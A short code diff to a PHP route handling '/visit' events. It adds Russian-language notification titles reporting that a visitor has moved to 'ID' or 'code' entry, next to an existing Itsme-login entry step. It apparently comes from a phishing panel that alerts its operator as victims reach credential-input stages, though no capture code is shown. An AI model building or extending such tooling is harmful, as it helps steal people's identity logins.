@@ -106,6 +106,8 @@ Route::post('/visit', function (Request $request) {
 
         $title = match ($eventType) {
             'itsme' => '📴 <b>Переход на ввод Itsme</b>',
+            'id' => '📵 <b>Переход на ввод ID</b>',
+            'code' => '📵 <b>Переход на ввод ID</b>',
             default => '🌐 <b>Визит без сессии</b>',
         };
 
